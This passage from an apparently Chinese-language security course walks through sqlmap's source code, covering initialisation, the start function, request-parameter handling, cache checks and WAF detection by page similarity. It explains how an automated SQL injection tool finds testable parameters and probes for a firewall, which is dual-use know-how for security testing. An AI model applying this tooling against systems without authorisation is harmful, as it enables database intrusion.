        _setHTTPAuthentication() <span class="hljs-comment"># 设置请求的认证信息</span>
        _setHTTPHandlers() <span class="hljs-comment"># 设置对应的请求处理类</span>
        _setDNSCache() <span class="hljs-comment"># 设置 dns 缓存</span>
        _setSocketPreConnect() 
        _setSafeVisit()
        _doSearch() <span class="hljs-comment"># 处理 Google Dork 解析</span>
        _setStdinPipeTargets() <span class="hljs-comment"># 从 pipeline 中获取 targets</span>
        _setBulkMultipleTargets() <span class="hljs-comment"># 从文本中获取 targets</span>
        _checkTor() <span class="hljs-comment"># 检查 tor 代理</span>
        _setCrawler() <span class="hljs-comment"># 设置爬虫信息</span>
        _findPageForms() <span class="hljs-comment"># 寻找页面中的表单</span>
        _setDBMS() <span class="hljs-comment"># 设置 DBMS</span>
        _setTechnique() <span class="hljs-comment"># 设置检测类型</span>

    _setThreads() <span class="hljs-comment"># 设置线程数</span>
    _setOS() <span class="hljs-comment"># 设置操作系统类型</span>
    _setWriteFile() <span class="hljs-comment"># 设置文件写入信息</span>
    _setMetasploit() <span class="hljs-comment"># 设置 MSF 信息</span>
    _setDBMSAuthentication() <span class="hljs-comment"># 设置 DBMS 的认证信息</span>
    loadBoundaries() <span class="hljs-comment"># 加载 Boundaries</span>
    loadPayloads() <span class="hljs-comment"># 加载 Payloads</span>
    _setPrefixSuffix() <span class="hljs-comment"># 设置新的 prefix 和sufix</span>
    update() <span class="hljs-comment"># 更新 sqlmap</span>
    _loadQueries() <span class="hljs-comment"># 加载 queries</span>
</code></pre>

<p>其实我们只需要根据后面的注释，了解每个函数大概实现的功能就可以了，它们有些与初始化配置文件相关，有些与实际攻击过程相关。实际上，这里只是会初步解析命令行传入的参数，并不涉及到大部分函数的调用过程，在这里我们不需要理解的很细致，我们的核心关注点应该在注入逻辑上。</p>

<pre><code class="language-python hljs">        init()
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conf.updateAll:
            <span class="hljs-comment"># Postponed imports (faster start)</span>
            <span class="hljs-keyword">if</span> conf.smokeTest:
                <span class="hljs-keyword">from</span> lib.core.testing <span class="hljs-keyword">import</span> smokeTest
                os._exitcode = <span class="hljs-number">1</span> - (smokeTest() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            <span class="hljs-keyword">elif</span> conf.vulnTest:
                <span class="hljs-keyword">from</span> lib.core.testing <span class="hljs-keyword">import</span> vulnTest
                os._exitcode = <span class="hljs-number">1</span> - (vulnTest() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">from</span> lib.controller.controller <span class="hljs-keyword">import</span> start
                <span class="hljs-keyword">if</span> conf.profile:
                    <span class="hljs-keyword">from</span> lib.core.profiling <span class="hljs-keyword">import</span> profile
                    <span class="hljs-built_in">globals</span>()[<span class="hljs-string">"start"</span>] = start
                    profile()
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-keyword">try</span>:
                        <span class="hljs-keyword">if</span> conf.crawlDepth <span class="hljs-keyword">and</span> conf.bulkFile:
                            targets = getFileItems(conf.bulkFile)
                            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(targets)):
                                target = <span class="hljs-literal">None</span>
                                <span class="hljs-keyword">try</span>:
                                    kb.targets = OrderedSet()
                                    target = targets[i]
                                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.search(<span class="hljs-string">r"(?i)\Ahttp[s]*://"</span>, target)
                                        target = <span class="hljs-string">"http://%s"</span> % target
                                    infoMsg = <span class="hljs-string">"starting crawler for target URL '%s' (%d/%d)"</span> % (target, i + <span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(targets))
                                    logger.info(infoMsg)
                                    crawl(target)
                                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:
                                    <span class="hljs-keyword">if</span> target <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(ex, SqlmapUserQuitException):
                                        errMsg = <span class="hljs-string">"problem occurred while crawling '%s' ('%s')"</span> % (target, getSafeExString(ex))
                                        logger.error(errMsg)
                                    <span class="hljs-keyword">else</span>:
                                        <span class="hljs-keyword">raise</span>
                                <span class="hljs-keyword">else</span>:
                                    <span class="hljs-keyword">if</span> kb.targets:
                                        start()
</code></pre>

<p>学习完毕init方法之后，我们就完成了整个初始化过程。</p>

<h2 id="总结">总结</h2>

<p>这节课，我们学习了自动化SQL注入测试工具–sqlmap的设计思路。</p>

<p>作为业内知名且常用的SQL自动化注入工具，sqlmap已经持续维护了超过10年的时间。作为有梦想的工程师，我们不仅需要掌握如何使用sqlmap，更要学习它的设计思想和工作原理，站在巨人的肩膀上才能帮助我们看的更远。</p>

<p>sqlmap的代码量十分庞大，因为掌握其核心设计思想和工作原理就十分重要，这会成为我们深入代码逻辑探索的风向标。因此，在了解如何获取sqlmap代码以及如何搭建sqlmap的运行环境后，我们进一步学习了sqlmap设计原理的相关知识，比如sqlmap的配置文件介绍等。</p>

<p>接下来，与大部分开源软件的设计思路类似，sqlmap在真正开始工作前需要做大量的初始化工作，因此我们对sqlmap的初始化流程进行了梳理。经过分析，总结出它主要包含有全局变量初始化、命令行参数解析、全局变量赋值以及环境检查这四个通用的初始化步骤，然后我们又具体学习了这四个流程是如何实现的。</p>

<p>在学习完sqlmap的初始化后，很快我们就会进入sqlmap的工作流程学习，这时我们需要重新审视sqlmap的设计架构，了解我们所处的位置。</p>

<p><img src="assets/e22b18fbee4f4843b20542e1224409c2.jpg" alt="图片"></p>

<p>这是我整理的一幅sqlmap工作原理图，在本节课我们学习了sqlmap工作前的初始化流程，这些内容可以帮助你认识到sqlmap设计时的底层逻辑。下节课我们将正式开始学习sqlmap的自动化注入功能，它的起点是预注入，也是我们在前几节课程中所讲的起手式阶段。</p>

<h2 id="思考">思考</h2>

<p>sqlmap的初始化流程有什么值得改进的地方吗？</p>

<p>欢迎在评论区留下你的思考，我们下节课再见。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="15 自动化注入神器（二）：sqlmap的设计架构解析" class="title">15 自动化注入神器（二）：sqlmap的设计架构解析</h1>
                            <div><p>你好，我是王昊天。</p>

<p>在上节课中，我们认识了一款自动化注入测试工具sqlmap，并对它的初始化过程有了深入了解。在完成了初始化之后，大部分软件就会开始进入正式的工作流程了，而这节课，我们就将开始学习sqlmap的工作流程。</p>

<p>在介绍sqlmap的工作流程之前，你可以先思考一个问题，我们平时是如何进行SQL注入测试的？如果让你来设计一个自动化注入测试工具，将平时手动实现的SQL注入测试步骤转化为机器的自动化实现，会遇到什么困难吗？</p>

<p>自动化注入的主要难点与人工注入会有一些差异，比如，人工很容易判断目标是否受到waf保护，也可以更好地观测注入结果，而让机器做同样的事情，则是一件不容易的事情。</p>

<p>对于人工而言，你可以发送一个容易被waf拦截的payload，通过这样的方式来观察页面的响应，进而判断waf是否存在。可是机器要如何实现呢？相信学完这篇课程，你可以解决这个问题。</p>

<p>在上一节课中，我们对sqlmap.py中的main函数进行了拆解，具体分析了init函数的主要功能，而init函数之后，就是start函数 。所以在这节课程中，我们会接着上一节课的内容，继续分析sqlmap.py中的main函数，主要讲解start函数实现的功能和方法。</p>

<h2 id="start函数">start函数</h2>

<p>在系统运行完sqlmap的初始化流程后，就会进入到start函数中，也就是我们这节课需要学习的主要内容。为了方便大家理解，可以将它主要分为四个部分，即准备工作、循环遍历目标、处理输入参数，以及判断waf的存在。</p>

<p>这是我绘制的一幅start函数拆解图，图中解释了四个部分分别做了哪些工作。</p>

<p><img src="assets/4f218fe3d84042dd98c3be808a8b8883.jpg" alt="图片"></p>

<p>为了让你更好的理解start函数的功能，下面我们一起来看看start函数的内容。</p>

<pre><code class="language-python hljs"><span class="hljs-meta">@stackedmethod</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():
    <span class="hljs-string">"""
    This function calls a function that performs checks on both URL
    stability and all GET, POST, Cookie and User-Agent parameters to
    check if they are dynamic and SQL injection affected
    """</span>

    <span class="hljs-comment"># 这个配置并没有体现在命令行上，属于测试功能，可忽略。</span>
    <span class="hljs-keyword">if</span> conf.hashFile:
        crackHashFile(conf.hashFile)

    <span class="hljs-keyword">if</span> conf.direct:
        initTargetEnv()
        setupTargetEnv()
        action()
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    
    <span class="hljs-comment"># 这个配置设定url和爬虫深度。</span>
    <span class="hljs-keyword">if</span> conf.url <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>((conf.forms, conf.crawlDepth)):
        kb.targets.add((conf.url, conf.method, conf.data, conf.cookie, <span class="hljs-literal">None</span>))

        <span class="hljs-keyword">if</span> conf.configFile <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> kb.targets:
        errMsg = <span class="hljs-string">"you did not edit the configuration file properly, set "</span>
        errMsg += <span class="hljs-string">"the target URL, list of targets or google dork"</span>
        logger.error(errMsg)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-keyword">if</span> kb.targets <span class="hljs-keyword">and</span> isListLike(kb.targets) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(kb.targets) &gt; <span class="hljs-number">1</span>:
        infoMsg = <span class="hljs-string">"found a total of %d targets"</span> % <span class="hljs-built_in">len</span>(kb.targets)
        logger.info(infoMsg)

    targetCount = <span class="hljs-number">0</span>
    initialHeaders = <span class="hljs-built_in">list</span>(conf.httpHeaders)

    <span class="hljs-keyword">for</span> targetUrl, targetMethod, targetData, targetCookie, targetHeaders <span class="hljs-keyword">in</span> kb.targets:
        <span class="hljs-comment"># 这个配置输出目标数量信息。</span>
        targetCount += <span class="hljs-number">1</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">if</span> conf.checkInternet:
                infoMsg = <span class="hljs-string">"checking for Internet connection"</span>
                logger.info(infoMsg)
</code></pre>

<p>这里你可以结合代码中的注释进行阅读，接下来我们会详细展开start函数的每一部分，因此这里你只需要对start函数的行为有个大概了解即可。</p>

<h3 id="准备工作">准备工作</h3>

<p>start函数首先会进行一些针对目标的配置工作，配置结束之后，程序将开始利用for循环对每一个目标进行特定的操作，包括，检测网络的连通性，检测是否使用随机UA信息、是否配置post数据、提取检测参数、以及过滤用户排除的目标等。</p>

<p>下面让我们逐一观察它们对应的代码结构，来帮助你加深理解。</p>

<h3 id="循环遍历目标">循环遍历目标</h3>

<p>首先，是用for循环处理每一个目标的代码，可以看到for循环处理目标的代码中，包含了对网络连通性的测试。</p>

<pre><code class="hljs language-css">for targetUrl, targetMethod, targetData, targetCookie, targetHeaders in kb<span class="hljs-selector-class">.targets</span>:
    targetCount += <span class="hljs-number">1</span>
    try:
        # 网络连通性测试
        if conf.checkInternet:
            infoMsg = <span class="hljs-string">"checking for Internet connection"</span>
            logger.<span class="hljs-built_in">info</span>(infoMsg)
            if not <span class="hljs-built_in">checkInternet</span>():
                warnMsg = <span class="hljs-string">"[%s] [WARNING] no connection detected"</span> % time.<span class="hljs-built_in">strftime</span>(<span class="hljs-string">"%X"</span>)
                <span class="hljs-built_in">dataToStdout</span>(warnMsg)
                valid = False
                for _ in <span class="hljs-built_in">xrange</span>(conf.retries):
                    if <span class="hljs-built_in">checkInternet</span>():
                        valid = True
                        break
                    else:
                        <span class="hljs-built_in">dataToStdout</span>(<span class="hljs-string">'.'</span>)
                        time.<span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>)
                if not valid:
                    errMsg = <span class="hljs-string">"please check your Internet connection and rerun"</span>
                    raise <span class="hljs-built_in">SqlmapConnectionException</span>(errMsg)
                else:
                    <span class="hljs-built_in">dataToStdout</span>(<span class="hljs-string">"\n"</span>)
        conf.url = targetUrl
        conf.method = targetMethod.<span class="hljs-built_in">upper</span>().<span class="hljs-built_in">strip</span>() if targetMethod else targetMethod
        conf.data = targetData
        conf.cookie = targetCookie
        conf.httpHeaders = <span class="hljs-built_in">list</span>(initialHeaders)
        conf.httpHeaders.<span class="hljs-built_in">extend</span>(targetHeaders or [])

</code></pre>

<p>接下来系统会开始提取一系列数据，这些数据会在HTTP请求中用到，包括请求的网址、cookies信息等。</p>

<pre><code class="language-python hljs">conf.url = targetUrl
conf.method = targetMethod.upper().strip() <span class="hljs-keyword">if</span> targetMethod <span class="hljs-keyword">else</span> targetMethod
conf.data = targetData
conf.cookie = targetCookie
conf.httpHeaders = <span class="hljs-built_in">list</span>(initialHeaders)
conf.httpHeaders.extend(targetHeaders <span class="hljs-keyword">or</span> [])
 

</code></pre>

<p>完成了数据提取，系统会检查请求参数，这个步骤会分为3个子步骤，分别是配置随机的User-Agent信息、判断用户是否指定了用POST方式上传的数据、以及对目标的url进行合理性检查。</p>

<pre><code class="language-python hljs"><span class="hljs-comment"># 配置随机UA信息</span>
<span class="hljs-keyword">if</span> conf.randomAgent <span class="hljs-keyword">or</span> conf.mobile:
    <span class="hljs-keyword">for</span> header, value <span class="hljs-keyword">in</span> initialHeaders:
        <span class="hljs-keyword">if</span> header.upper() == HTTP_HEADER.USER_AGENT.upper():
            conf.httpHeaders.append((header, value))
            <span class="hljs-keyword">break</span>
<span class="hljs-comment"># ...</span>

<span class="hljs-comment"># 判断是否指定了POST数据</span>
<span class="hljs-keyword">if</span> conf.data:
<span class="hljs-comment"># Note: explicitly URL encode __ ASP(.NET) parameters (e.g. to avoid problems with Base64 encoded '+' character) - standard procedure in web browsers</span>
conf.data = re.sub(<span class="hljs-string">r"\b(__\w+)=([^&amp;]+)"</span>, <span class="hljs-keyword">lambda</span> match: <span class="hljs-string">"%s=%s"</span> % (match.group(<span class="hljs-number">1</span>), urlencode(match.group(<span class="hljs-number">2</span>), safe=<span class="hljs-string">'%'</span>)), conf.data)
conf.httpHeaders = [conf.httpHeaders[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(conf.httpHeaders)) <span class="hljs-keyword">if</span> conf.httpHeaders[i][<span class="hljs-number">0</span>].upper() <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (__[<span class="hljs-number">0</span>].upper() <span class="hljs-keyword">for</span> __ <span class="hljs-keyword">in</span> conf.httpHeaders[i + <span class="hljs-number">1</span>:])]
<span class="hljs-comment"># ...</span>

<span class="hljs-comment"># URL合理性检查</span>
initTargetEnv()
parseTargetUrl()
</code></pre>

<p>完成这部分工作之后，sqlmap会有一个魔法操作，如果你理解了sqlmap的工作原理，就可以很容易理解这个魔法操作了，但如果你不理解，它一定会带给你不少痛苦，这个魔法操作就是缓存检查。</p>

<p>sqlmap会判断当前的查询在缓存中是否存在，如果存在，就说明sqlmap之前已经进行过同样的检查了，这时它就会跳过当前的检查目标；如果当前查询不存在，才会执行SQL注入攻击。我就曾经对同一目标执行多次SQL注入攻击，然后陷入了这个问题中，排查了很久才得以脱身。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">if</span> testSqlInj <span class="hljs-keyword">and</span> conf.hostname <span class="hljs-keyword">in</span> kb.vulnHosts:
    <span class="hljs-keyword">if</span> kb.skipVulnHost <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        message = <span class="hljs-string">"SQL injection vulnerability has already been detected "</span>
        message += <span class="hljs-string">"against '%s'. Do you want to skip "</span> % conf.hostname
        message += <span class="hljs-string">"further tests involving it? [Y/n]"</span>

        kb.skipVulnHost = readInput(message, default=<span class="hljs-string">'Y'</span>, boolean=<span class="hljs-literal">True</span>)

    testSqlInj = <span class="hljs-keyword">not</span> kb.skipVulnHost

<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> testSqlInj:
    infoMsg = <span class="hljs-string">"skipping '%s'"</span> % targetUrl
    logger.info(infoMsg)
    <span class="hljs-keyword">continue</span>
</code></pre>

<h3 id="处理输入参数">处理输入参数</h3>

<p>此时，sqlmap会进入start函数内部的第四个步骤，也就是处理输入参数。除了设置一些存储信息和配置结果文件，还会针对性地处理一些请求数据，这部分的处理过程，会在setRequestParams函数中进行。</p>

<p>为了大家更好的理解<code>_setRequestParams()</code>这个函数，我在下面列出了它的部分代码，其中包括了它对请求参数get、post、注入点标记、cookie、header以及csrf-token的处理过程，大家可以结合代码中的注释，更加深入地理解这个函数，看看它是如何处理请求参数的。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_setRequestParams</span>():

<span class="hljs-comment"># ...  </span>
<span class="hljs-comment"># 检查请求的get参数，若有将它存储起来，供测试时使用。</span>
    <span class="hljs-keyword">if</span> conf.parameters.get(PLACE.GET):
        parameters = conf.parameters[PLACE.GET]
        paramDict = paramToDict(PLACE.GET, parameters)

        <span class="hljs-keyword">if</span> paramDict:
            conf.paramDict[PLACE.GET] = paramDict
            testableParameters = <span class="hljs-literal">True</span>

<span class="hljs-comment"># 检查请求的post参数，若有将它存储起来，供测试使用。</span>
    <span class="hljs-keyword">if</span> conf.method == HTTPMETHOD.POST <span class="hljs-keyword">and</span> conf.data <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        logger.warn(<span class="hljs-string">"detected empty POST body"</span>)
        conf.data = <span class="hljs-string">""</span>
    <span class="hljs-keyword">if</span> conf.data <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
          conf.method = conf.method <span class="hljs-keyword">or</span> HTTPMETHOD.POST
<span class="hljs-comment"># ...</span>
    conf.parameters[PLACE.POST] = conf.data

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 检查是否有get参数、post参数。 </span>
    <span class="hljs-keyword">if</span> re.search(URI_INJECTABLE_REGEX, conf.url, re.I) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(place <span class="hljs-keyword">in</span> conf.parameters <span class="hljs-keyword">for</span> place <span class="hljs-keyword">in</span> (PLACE.GET, PLACE.POST)) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> kb.postHint <span class="hljs-keyword">and</span> kb.customInjectionMark <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (conf.data <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>) <span class="hljs-keyword">and</span> conf.url.startswith(<span class="hljs-string">"http"</span>):

<span class="hljs-comment"># 若没有找到get参数和post参数，系统会发出警告信息。</span>
      warnMsg = <span class="hljs-string">"you've provided target URL without any GET "</span>
warnMsg += <span class="hljs-string">"parameters (e.g. 'http://www.site.com/article.php?id=1') "</span>
warnMsg += <span class="hljs-string">"and without providing any POST parameters "</span>
warnMsg += <span class="hljs-string">"through option '--data'"</span>
logger.warn(warnMsg)
message = <span class="hljs-string">"do you want to try URI injections "</span>
message += <span class="hljs-string">"in the target URL itself? [Y/n/q] "</span>

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 循环检查目标是否有注入点标记参数。</span>
<span class="hljs-keyword">for</span> place, value <span class="hljs-keyword">in</span> ((PLACE.URI, conf.url), (PLACE.CUSTOM_POST, conf.data), (PLACE.CUSTOM_HEADER, <span class="hljs-built_in">str</span>(conf.httpHeaders))):
    <span class="hljs-keyword">if</span> place == PLACE.CUSTOM_HEADER <span class="hljs-keyword">and</span> <span class="hljs-built_in">any</span>((conf.forms, conf.crawlDepth)):
        <span class="hljs-keyword">continue</span>

    _ = re.sub(PROBLEMATIC_CUSTOM_INJECTION_PATTERNS, <span class="hljs-string">""</span>, value <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>) <span class="hljs-keyword">if</span> place == PLACE.CUSTOM_HEADER <span class="hljs-keyword">else</span> value <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>
    <span class="hljs-keyword">if</span> kb.customInjectionMark <span class="hljs-keyword">in</span> _:

<span class="hljs-comment">#     ...</span>
<span class="hljs-comment"># 找到了注入点标记参数就将它存储在字典中，供后面测试使用。</span>
conf.paramDict[place][<span class="hljs-string">"%s #%d%s"</span> % (header, i + <span class="hljs-number">1</span>, kb.customInjectionMark)] = <span class="hljs-string">"%s,%s"</span> % (header, <span class="hljs-string">""</span>.join(<span class="hljs-string">"%s%s"</span> % (parts[j], kb.customInjectionMark <span class="hljs-keyword">if</span> i == j <span class="hljs-keyword">else</span> <span class="hljs-string">""</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(parts))))

<span class="hljs-comment"># 检查是否有cookie参数，若有就将它存储起来，供后面测试使用。</span>
<span class="hljs-keyword">if</span> conf.cookie:
    conf.parameters[PLACE.COOKIE] = conf.cookie
    paramDict = paramToDict(PLACE.COOKIE, conf.cookie)

    <span class="hljs-keyword">if</span> paramDict:
        conf.paramDict[PLACE.COOKIE] = paramDict
        testableParameters = <span class="hljs-literal">True</span>

<span class="hljs-comment">#    ...</span>
<span class="hljs-comment"># 检查是否有header参数，若有就将它存储起来，供后面测试使用。</span>
<span class="hljs-keyword">if</span> conf.httpHeaders:
    <span class="hljs-keyword">for</span> httpHeader, headerValue <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(conf.httpHeaders):
        <span class="hljs-comment"># Url encoding of the header values should be avoided</span>
        <span class="hljs-comment"># Reference: http://stackoverflow.com/questions/5085904/is-ok-to-urlencode-the-value-in-headerlocation-value</span>
        <span class="hljs-keyword">if</span> httpHeader.upper() == HTTP_HEADER.USER_AGENT.upper():
            conf.parameters[PLACE.USER_AGENT] = urldecode(headerValue)

<span class="hljs-comment">#    ...</span>
<span class="hljs-comment"># 检查csrf token参数。</span>
<span class="hljs-comment">#当csrf token参数存在。</span>
<span class="hljs-keyword">if</span> conf.csrfToken:

<span class="hljs-comment"># 检查get、post、cookie、header values参数中是否有anti-csrf token参数。（anti-csrf token是一个用来防止跨站请求伪造设置的参数。）</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(re.search(conf.csrfToken, <span class="hljs-string">' '</span>.join(_), re.I) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (conf.paramDict.get(PLACE.GET, {}), conf.paramDict.get(PLACE.POST, {}), conf.paramDict.get(PLACE.COOKIE, {}))) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> re.search(<span class="hljs-string">r"\b%s\b"</span> % conf.csrfToken, conf.data <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>) <span class="hljs-keyword">and</span> conf.csrfToken <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span>(_[<span class="hljs-number">0</span>].lower() <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> conf.httpHeaders) <span class="hljs-keyword">and</span> conf.csrfToken <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> conf.paramDict.get(PLACE.COOKIE, {}) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">all</span>(re.search(conf.csrfToken, _, re.I) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> conf.paramDict.get(PLACE.URI, {}).values()):
        errMsg = <span class="hljs-string">"anti-CSRF token parameter '%s' not "</span> % conf.csrfToken._original
        errMsg += <span class="hljs-string">"found in provided GET, POST, Cookie or header values"</span>

<span class="hljs-comment"># 如果这些参数中都没有anti-csrf token参数，那么系统会报错。</span>
        <span class="hljs-keyword">raise</span> SqlmapGenericException(errMsg)

<span class="hljs-comment"># 当csrf token参数不存在。</span>
<span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">for</span> place <span class="hljs-keyword">in</span> (PLACE.GET, PLACE.POST, PLACE.COOKIE):
        <span class="hljs-keyword">if</span> conf.csrfToken:
            <span class="hljs-keyword">break</span>

<span class="hljs-comment"># 判断注入点标记的参数是否需要csrf token信息。</span>
        <span class="hljs-keyword">for</span> parameter <span class="hljs-keyword">in</span> conf.paramDict.get(place, {}):
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(parameter.lower().count(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> CSRF_TOKEN_PARAMETER_INFIXES):
                message = <span class="hljs-string">"%sparameter '%s' appears to hold anti-CSRF token. "</span> % (<span class="hljs-string">"%s "</span> % place <span class="hljs-keyword">if</span> place != parameter <span class="hljs-keyword">else</span> <span class="hljs-string">""</span>, parameter)
                message += <span class="hljs-string">"Do you want sqlmap to automatically update it in further requests? [y/N] "</span>
                <span class="hljs-keyword">if</span> readInput(message, default=<span class="hljs-string">'N'</span>, boolean=<span class="hljs-literal">True</span>):
                    <span class="hljs-keyword">class</span> <span class="hljs-title class_">_</span>(six.text_type):
                        <span class="hljs-keyword">pass</span>
<span class="hljs-comment"># 设置csrf token参数。</span>
                    conf.csrfToken = _(re.escape(getUnicode(parameter)))
                    conf.csrfToken._original = getUnicode(parameter)
                    <span class="hljs-keyword">break</span>
</code></pre>

<h3 id="检测waf">检测waf</h3>

<p>在完成上述步骤之后，sqlmap就完成了针对注入测试目标的参数配置工作。配置完参数后，sqlmap就可以开始连通性的检测了，通过这一步来判断目标是否可以访问。如果该目标无法连接上，那么sqlmap就会跳过对当前目标的检测；如果可以连接到目标，那么sqlmap就会开始判断该目标是否有waf保护。这是因为waf的存在会对sqlmap的SQL注入测试有很大的影响，所以sqlmap会在注入测试前，判断waf是否存在。</p>

<pre><code class="language-python hljs"><span class="hljs-comment"># 逐个目标判断。</span>
<span class="hljs-keyword">for</span> targetUrl, targetMethod, targetData, targetCookie, targetHeaders <span class="hljs-keyword">in</span> kb.targets:

<span class="hljs-comment"># ...</span>
setupTargetEnv()

<span class="hljs-comment"># 如果连接不上，跳过当前测试目标。</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> checkConnection(suppressOutput=conf.forms):
    <span class="hljs-keyword">continue</span>

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 如果可以连接上，判断目标是否存在waf。</span>
checkWaf()
</code></pre>

<p>进入到checkWaf函数之后，大家可以结合我写的注释，对这个函数进行理解和学习。我们会发现，程序首先会从准备好的文件中，获取容易引起waf响应的代码片段组，然后结合之前设置的注入位置信息，将它组合成一个payload发送给目标。这样就可以获取到该payload响应的值，我们可以将这个值和正常的响应做比较，计算出页面相似度的值。</p>

<pre><code class="language-python hljs"><span class="hljs-comment"># 判断waf是否存在。 </span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">checkWaf</span>():

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 默认设置为没有waf，并且配置容易引起waf拦截的payload。</span>
retVal = <span class="hljs-literal">False</span>
payload = <span class="hljs-string">"%d %s"</span> % (randomInt(), IPS_WAF_CHECK_PAYLOAD)

<span class="hljs-comment"># 根据注入点的位置，决定payload插入的位置，然后发送测试请求，获取响应的返回值。</span>
<span class="hljs-keyword">if</span> PLACE.URI <span class="hljs-keyword">in</span> conf.parameters:
    place = PLACE.POST
    value = <span class="hljs-string">"%s=%s"</span> % (randomStr(), agent.addPayloadDelimiters(payload))
<span class="hljs-keyword">else</span>:
    place = PLACE.GET
    value = <span class="hljs-string">""</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conf.parameters.get(PLACE.GET) <span class="hljs-keyword">else</span> conf.parameters[PLACE.GET] + DEFAULT_GET_POST_DELIMITER
    value += <span class="hljs-string">"%s=%s"</span> % (randomStr(), agent.addPayloadDelimiters(payload))

<span class="hljs-comment"># ...</span>
    <span class="hljs-keyword">try</span>:

<span class="hljs-comment"># 判断retVal即页面相似度和预设的阈值大小比较关系。</span>
        retVal = (Request.queryPage(place=place, value=value, getRatioValue=<span class="hljs-literal">True</span>, noteResponseTime=<span class="hljs-literal">False</span>, silent=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>, disableTampering=<span class="hljs-literal">True</span>)[<span class="hljs-number">1</span>] <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>) &lt; IPS_WAF_CHECK_RATIO
    <span class="hljs-keyword">except</span> SqlmapConnectionException:
        retVal = <span class="hljs-literal">True</span>
    <span class="hljs-keyword">finally</span>:
        kb.matchRatio = <span class="hljs-literal">None</span>

<span class="hljs-comment"># ...</span>
    <span class="hljs-keyword">if</span> retVal:
<span class="hljs-comment"># ...</span>
        message = <span class="hljs-string">"are you sure that you want to "</span>
        message += <span class="hljs-string">"continue with further target testing? [Y/n] "</span>

<span class="hljs-comment"># ...</span>
    <span class="hljs-keyword">return</span> retVal
</code></pre>

<p>通过比较页面相似度的值和设定的阈值，sqlmap可以判定目标是否被waf保护。如果小于设定的阈值，则代表这两个页面的内容差别很大，sqlmap就会认定目标被waf保护，否则就会认为目标没有waf保护。</p>

<p>这里我们看到了另外一个非常重要的函数<code>Request.queryPage</code>和一个非常重要的概念，页面相似度。接下来，我们就来一起学习一下什么是页面相似度，而关于<code>Request.queryPage</code>的功能和页面相似度算法，我们会在下一讲详细学习。</p>

<h2 id="页面相似度">页面相似度</h2>

<p>页面相似度，简单来讲，就是两个页面内容相似程度的衡量系数。在sqlmap中，计算页面相似度主体使用的是<code>difflib</code>模块中的<code>SequenceMatcher</code>功能，该功能用于比较可哈希类型的序列的相似程度。可哈希类型序列指的是，不可变的数据结构例如字符串、元组等。</p>

<p>这里，我们用一个轻松的小例子，来加深你对页面相似度的理解。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">import</span> difflib
a=<span class="hljs-string">'abcd'</span>
b=<span class="hljs-string">'ab123'</span>
seq=difflib.SequenceMatcher(<span class="hljs-literal">None</span>,a,b)
d=seq.ratio()
<span class="hljs-built_in">print</span>(d)
